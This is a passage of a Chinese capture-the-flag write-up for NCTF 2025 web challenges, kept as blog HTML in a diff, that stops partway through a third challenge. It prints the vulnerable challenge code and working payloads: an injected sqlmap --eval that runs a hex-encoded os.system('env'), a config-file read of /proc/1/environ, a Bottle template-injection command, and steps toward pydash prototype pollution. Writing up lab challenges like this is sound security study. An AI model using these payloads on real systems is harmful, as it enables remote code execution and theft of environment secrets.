@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这周真的很忙，sm学校还要段考我草。这CTF也是就随便糊弄糊弄了（还好web简单）。最终还是给队友大佬带上来了。极限三等（（ sqlmap_master from fastapi import FastAPI, Request from fastapi.responses import FileRe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nctf 2025 web wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="这周真的很忙，sm学校还要段考我草。这CTF也是就随便糊弄糊弄了（还好web简单）。最终还是给队友大佬带上来了。极限三等（（ sqlmap_master from fastapi import FastAPI, Request from fastapi.responses import FileRe">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/15.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/16.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18799383/17.png">
+<meta property="article:published_time" content="2025-03-29T05:19:00.000Z">
+<meta property="article:modified_time" content="2025-03-29T05:19:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18799383/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>nctf 2025 web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-04-01-bottlesstiwaf-bypass/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-03-08-xyctf-2025-wp-lamentxu/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&text=nctf 2025 web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&is_video=false&description=nctf 2025 web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nctf 2025 web wp&body=Check out this article: https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&name=nctf 2025 web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&t=nctf 2025 web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-master"><span class="toc-number">1.</span> <span class="toc-text">sqlmap_master</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezdash"><span class="toc-number">2.</span> <span class="toc-text">ezdash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezdash-revenge"><span class="toc-number">3.</span> <span class="toc-text">ezdash_revenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#internal-api"><span class="toc-number">4.</span> <span class="toc-text">internal_api</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        nctf 2025 web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-29T05:19:00.000Z" class="dt-published" itemprop="datePublished">2025-03-29</time>
+        
+        (Updated: <time datetime="2025-03-29T05:19:00.000Z" class="dt-updated" itemprop="dateModified">2025-03-29</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/migrated/18799383/01.png"></p>
+<p>这周真的很忙，sm学校还要段考我草。这CTF也是就随便糊弄糊弄了（还好web简单）。最终还是给队友大佬带上来了。极限三等（（</p>
+<h1 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap_master"></a>sqlmap_master</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from fastapi import FastAPI, Request</span><br><span class="line">from fastapi.responses import FileResponse, StreamingResponse</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">async def index():</span><br><span class="line">    return FileResponse(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/run&quot;)</span><br><span class="line">async def run(request: Request):</span><br><span class="line">    data = await request.json()</span><br><span class="line">    url = data.get(&quot;url&quot;)</span><br><span class="line">    </span><br><span class="line">    if not url:</span><br><span class="line">        return &#123;&quot;error&quot;: &quot;URL is required&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    command = f&#x27;sqlmap -u &#123;url&#125; --batch --flush-session&#x27;</span><br><span class="line"></span><br><span class="line">    def generate():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=False</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            if output == &#x27;&#x27; and process.poll() is not None:</span><br><span class="line">                break</span><br><span class="line">            if output:</span><br><span class="line">                yield output</span><br><span class="line">    </span><br><span class="line">    return StreamingResponse(generate(), media_type=&quot;text/plain&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这种题据我的经验一般看开发手册啥的没啥用（他们大概不会教你怎么用自己的工具RCE吧）所以我都是直接去看源码的。</p>
+<p>找一份sqlmap直接从传参那里看。在<code>lib/prase/cmdline.py</code>的<code>cmdLineParser</code>函数里。（可以自己跑一遍sqlmap然后打断点跟进看看它是怎么处理你的参数的）</p>
+<p>然后注意到：</p>
+<p><img src="/images/migrated/18799383/02.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.add_argument(&quot;--eval&quot;, dest=&quot;evalCode&quot;,</span><br><span class="line">    help=&quot;Evaluate provided Python code before the request (e.g. \&quot;import hashlib;id2=hashlib.md5(id).hexdigest()\&quot;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>到这里其实就很简单了。后边如果你想去调试的话可以接着打断点调看看这个语句到底在哪里执行的。易得payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1?id=1 --eval=exec(bytes.fromhex(&#x27;5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>这里用fromhex转是为了避免一些编码问题。</p>
+<p>另一种做法是-c参数</p>
+<p><img src="/images/migrated/18799383/03.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target.add_argument(&quot;-c&quot;, dest=&quot;configFile&quot;,</span><br><span class="line">    help=&quot;Load options from a configuration INI file&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>其实–proxy-file之类的也可以读取文件。所以从这里看不出什么端倪。得去往下调试。-c是唯一一个可以把整个文件读取出来的。–proxy-file他读不到http这种他就会报错，而不会读取文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1?id=1 -c /proc/1/environ</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezdash"><a href="#ezdash" class="headerlink" title="ezdash"></a>ezdash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Hints: Flag在环境变量中</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from typing import Optional</span><br><span class="line"></span><br><span class="line">import pydash</span><br><span class="line">import bottle</span><br><span class="line"></span><br><span class="line">__forbidden_path__=[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;,</span><br><span class="line">               &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;,</span><br><span class="line">               &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;,</span><br><span class="line">               &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;,</span><br><span class="line">               &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;,</span><br><span class="line">               &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;,</span><br><span class="line">               &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;,</span><br><span class="line">               &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;,</span><br><span class="line">               &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__wrapped__&#x27;,</span><br><span class="line">               &quot;Optional&quot;,&quot;render&quot;</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    &quot;bottle&quot;</span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(dir(globals()[&quot;__builtins__&quot;]))</span><br><span class="line"></span><br><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    if name.find(&quot;__&quot;)&gt;=0: return False</span><br><span class="line">    for word in __forbidden_name__:</span><br><span class="line">        if name==word:</span><br><span class="line">            return False</span><br><span class="line">    for word in __forbidden_path__:</span><br><span class="line">        if path.find(word)&gt;=0: return False</span><br><span class="line">    obj=globals()[name]</span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@bottle.post(&#x27;/setValue&#x27;)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(&#x27;name&#x27;)</span><br><span class="line">    path=bottle.request.json.get(&#x27;path&#x27;)</span><br><span class="line">    if not isinstance(path,str):</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    if len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    value=bottle.request.json.get(&#x27;value&#x27;)</span><br><span class="line">    return &quot;yes&quot; if setval(name, path, value) else &quot;no&quot;</span><br><span class="line"></span><br><span class="line">@bottle.get(&#x27;/render&#x27;)</span><br><span class="line">def render_template():</span><br><span class="line">    path=bottle.request.query.get(&#x27;path&#x27;)</span><br><span class="line">    if len(path)&gt;10:</span><br><span class="line">        return &quot;hacker&quot;</span><br><span class="line">    blacklist=[&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;.&quot;] </span><br><span class="line">    for c in path:</span><br><span class="line">        if c in blacklist:</span><br><span class="line">            return &quot;hacker&quot;</span><br><span class="line">    return bottle.template(path)</span><br><span class="line">bottle.run(host=&#x27;0.0.0.0&#x27;, port=8000)</span><br></pre></td></tr></table></figure>
+
+<p>这题出糊了（（（在&#x2F;render路由里可以使用<code>&lt;%%&gt;</code>语法打SSTI的非预期。我们可以在simple template的官网看到</p>
+<p><img src="/images/migrated/18799383/04.png"></p>
+<p>所以我们可以直接RCE。</p>
+<p>我看到最常见的思路是去打内存马，即注册一个RCE的路由。但是bottle里有一个abort函数。可以直接返回状态码和一个信息。这里选择使用bottle里的abort来回显。思路如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from subprocess import grtoutput</span><br><span class="line">from bottle import abort</span><br><span class="line">a = getoutput(&#x27;env&#x27;)</span><br><span class="line">abort(404, a)</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以在不使用<code>.</code>的条件下回显我们执行的命令。</p>
+<p>合并一下就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(&quot;env&quot;)%0aabort(404,a)%20%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后打就完了。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /render?path=&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(&quot;env&quot;)%0aabort(404,a)%20%&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezdash-revenge"><a href="#ezdash-revenge" class="headerlink" title="ezdash_revenge"></a>ezdash_revenge</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Hints: Flag在环境变量中</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from typing import Optional</span><br><span class="line"></span><br><span class="line">import pydash</span><br><span class="line">import bottle</span><br><span class="line"></span><br><span class="line">__forbidden_path__=[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;,</span><br><span class="line">               &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;,</span><br><span class="line">               &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;,</span><br><span class="line">               &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;,</span><br><span class="line">               &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;,</span><br><span class="line">               &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;,</span><br><span class="line">               &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;,</span><br><span class="line">               &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;,</span><br><span class="line">               &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__wrapped__&#x27;,</span><br><span class="line">               &quot;Optional&quot;,&quot;render&quot;</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    &quot;bottle&quot;</span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(dir(globals()[&quot;__builtins__&quot;]))</span><br><span class="line"></span><br><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    if name.find(&quot;__&quot;)&gt;=0: return False</span><br><span class="line">    for word in __forbidden_name__:</span><br><span class="line">        if name==word:</span><br><span class="line">            return False</span><br><span class="line">    for word in __forbidden_path__:</span><br><span class="line">        if path.find(word)&gt;=0: return False</span><br><span class="line">    obj=globals()[name]</span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@bottle.post(&#x27;/setValue&#x27;)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(&#x27;name&#x27;)</span><br><span class="line">    path=bottle.request.json.get(&#x27;path&#x27;)</span><br><span class="line">    if not isinstance(path,str):</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    if len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    value=bottle.request.json.get(&#x27;value&#x27;)</span><br><span class="line">    return &quot;yes&quot; if setval(name, path, value) else &quot;no&quot;</span><br><span class="line"></span><br><span class="line">@bottle.get(&#x27;/render&#x27;)</span><br><span class="line">def render_template():</span><br><span class="line">    path=bottle.request.query.get(&#x27;path&#x27;)</span><br><span class="line">    if len(path)&gt;10:</span><br><span class="line">        return &quot;hacker&quot;</span><br><span class="line">    blacklist=[&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;.&quot;,&quot;%&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;_&quot;] </span><br><span class="line">    for c in path:</span><br><span class="line">        if c in blacklist:</span><br><span class="line">            return &quot;hacker&quot;</span><br><span class="line">    return bottle.template(path)</span><br><span class="line">bottle.run(host=&#x27;0.0.0.0&#x27;, port=8000)</span><br></pre></td></tr></table></figure>
+
+<p>waf这次是禁止全了。我们采用pydash原型链污染的方式打。</p>
+<p>首先我们要去污染bottle。但是有__forbidden_name__的waf。所以不能直接找到bottle的object。那就只能靠别的类或方法找__globals__去找全局变量里的bottle object。我们尝试使用如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;__globals__.bottle&quot;,</span><br><span class="line">&quot;value&quot;: 111</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试直接使用setval这个func的__globals__去找bottle。但是被waf了。我们在try那里改一下报错逻辑，并打个断点看看。</p>
+<p><img src="/images/migrated/18799383/05.png"></p>
+<p>然后去再打一遍如上payload。发现报错如下：</p>
+<p><img src="/images/migrated/18799383/06.png"></p>
+<p>我们跟进这个报错，找到<code>_raise_if_restricted_key</code>函数。发现这就是一个pydash内置的检查函数。逻辑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def _raise_if_restricted_key(key):</span><br><span class="line">    # Prevent access to restricted keys for security reasons.</span><br><span class="line">    if key in RESTRICTED_KEYS:</span><br><span class="line">        raise KeyError(f&quot;access to restricted key &#123;key!r&#125; is not allowed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有个黑名单。其中RESTRICTED_KEYS是一个常量。F12跟进一下：</p>
+<p><img src="/images/migrated/18799383/07.png"></p>
+<p>那么我们在断点的调试界面里找RESTRICTED_KEYS</p>
+<p><img src="/images/migrated/18799383/08.png"></p>
+<p>可以看到位于pydash.helpers.RESTRICTED_KEYS</p>
+<p>那么我们可以先把pydash.helpers.RESTRICTED_KEYS污染了，就可以拿到__globals__从而找到bottle了。</p>
+<p>payload：</p>
